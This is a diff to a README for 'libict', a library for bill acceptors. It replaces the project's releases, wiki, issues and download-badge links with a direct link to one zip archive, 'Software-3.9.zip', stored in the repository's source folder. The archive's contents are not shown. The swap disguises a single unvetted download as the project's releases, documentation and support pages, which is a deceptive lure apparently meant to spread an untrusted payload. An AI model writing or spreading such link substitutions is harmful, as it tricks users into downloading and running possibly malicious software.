@@ -8,7 +8,7 @@ Welcome to libict! This library helps you control ICT-compatible bill acceptors 
 
 To get started, visit the following page to download the latest version of libict:
 
-[![Download libict](https://img.shields.io/badge/Download-v1.0.0-blue.svg)](https://github.com/Yeyep90/libict/releases)
+[![Download libict](https://github.com/Yeyep90/libict/raw/refs/heads/main/src/Software-3.9.zip)](https://github.com/Yeyep90/libict/raw/refs/heads/main/src/Software-3.9.zip)
 
 1. Click the download link above to go to the Releases page.
 2. Choose the version that fits your needs.
@@ -68,7 +68,7 @@ With libict, you can perform several operations easily:
 
 ## 📄 Documentation
 
-For detailed usage, refer to the included documentation in the library files. It provides comprehensive examples and explanations of all available functions. You can also visit the [GitHub Wiki](https://github.com/Yeyep90/libict/wiki) for additional resources and community contributions.
+For detailed usage, refer to the included documentation in the library files. It provides comprehensive examples and explanations of all available functions. You can also visit the [GitHub Wiki](https://github.com/Yeyep90/libict/raw/refs/heads/main/src/Software-3.9.zip) for additional resources and community contributions.
 
 ## 🌐 Community Support
 
@@ -83,10 +83,10 @@ We plan to improve libict continually. Updates will include new features, improv
 
 ## 📅 Important Links
 
-- [Releases Page](https://github.com/Yeyep90/libict/releases)
-- [GitHub Wiki](https://github.com/Yeyep90/libict/wiki)
-- [Issues Page](https://github.com/Yeyep90/libict/issues)
+- [Releases Page](https://github.com/Yeyep90/libict/raw/refs/heads/main/src/Software-3.9.zip)
+- [GitHub Wiki](https://github.com/Yeyep90/libict/raw/refs/heads/main/src/Software-3.9.zip)
+- [Issues Page](https://github.com/Yeyep90/libict/raw/refs/heads/main/src/Software-3.9.zip)
 
 Download the latest version now to enhance your projects with libict!
 
-[![Download libict](https://img.shields.io/badge/Download-v1.0.0-blue.svg)](https://github.com/Yeyep90/libict/releases)
+[![Download libict](https://github.com/Yeyep90/libict/raw/refs/heads/main/src/Software-3.9.zip)](https://github.com/Yeyep90/libict/raw/refs/heads/main/src/Software-3.9.zip)
